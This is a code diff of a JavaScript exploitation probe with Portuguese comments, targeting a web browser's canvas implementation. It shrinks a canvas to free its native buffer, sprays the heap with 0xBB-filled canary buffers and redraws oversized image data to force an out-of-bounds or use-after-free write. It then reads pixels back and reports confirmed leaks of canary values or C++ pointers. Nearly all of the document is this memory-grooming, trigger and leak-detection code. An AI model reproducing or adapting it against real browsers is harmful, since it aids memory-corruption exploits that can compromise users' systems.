@@ -26,20 +26,24 @@ export default {
         this.toxicData.data.fill(0x41); 
     },
 
-    trigger: function() {
+   trigger: function() {
         try {
-            // O GATILHO DA CORRIDA SÍNCRONA
-            // 1. Encolhemos o canvas para 1 pixel, forçando o C++ a libertar o buffer de 500x500
+            // 1. Encolhemos o canvas para 1 pixel (Liberta o buffer C++)
             this.canvas.width = 1; 
             
-            // 2. Inundação de memória
-            let trash = Groomer.sprayStrings(100, 1024 * 250); // 250KB strings
+            // 2. A PROVA DOS NOVE: Plantamos o nosso "Canário" na memória
+            // Criamos buffers pesados preenchidos EXATAMENTE com o valor 0xBB (187)
+            this.canary = [];
+            for(let i = 0; i < 50; i++) {
+                let buf = new Uint8Array(1024 * 250);
+                buf.fill(0xBB); // 0xBB = 187
+                this.canary.push(buf);
+            }
             
-            // 3. Forçamos o desenho dos 500x500 originais. O C++ devia rejeitar isto ou clipar.
-            // Se o bounds check falhar, vai escrever fora do buffer (OOB Write)!
+            // 3. Forçamos o bug (O C++ tenta desenhar na memória libertada)
             this.ctx.putImageData(this.toxicData, 0, 0);
             
-            // 4. Se não crashou, tentamos extrair o lixo adjacente!
+            // 4. Lemos o vazamento
             this.results.leaked = this.ctx.getImageData(0, 0, 2, 1);
         } catch(e) {
             this.results.error = e.message;
@@ -49,21 +53,26 @@ export default {
     probe: [
         s => s.results.error || 'Pintura Gráfica Aceite',
         
-        // Probe de LEAK (OOB Read)
         s => {
             if (s.results.leaked) {
                 let pixel = s.results.leaked.data;
-                // Como pintámos com 0x41 (65), se a cor lida for diferente
-                // (e diferente de 0), estamos a ver dados nativos de outras partes da RAM!
-                if (pixel[0] !== 0 && pixel[0] !== 65) {
-                    // Retornamos um número gigante para ativar o STALE DATA
-                    let hex = (pixel[0] << 16) | (pixel[1] << 8) | pixel[2];
-                    return hex; 
+                
+                // Se o pixel lido for 0 (preto transparente), o C++ defendeu-se (Falso Positivo).
+                // Se o pixel lido for 65 (0x41 - os "A"s que pintámos originalmente), o bug falhou.
+                
+                let r = pixel[0];
+                
+                // 🚨 A CONFIRMAÇÃO DO BUG 🚨
+                if (r === 187) { // 187 é o nosso 0xBB
+                    return `🏆 OOB CONFIRMADO! O Canvas leu o ArrayBuffer: 0xBBBBBB`;
+                } else if (r !== 0 && r !== 65) {
+                    // Leu outra coisa da RAM (Ponteiros ou metadados C++)
+                    return `💥 LEAK REAL (Metadados): Leu o valor ${r}`;
                 }
             }
-            return 0; // Protegido (Buffer Clipado)
+            return 0; // Falso Positivo / Seguro
         }
-    ],
+    ], 
 
     cleanup: function() {
         try { this.canvas.remove(); } catch(e){}
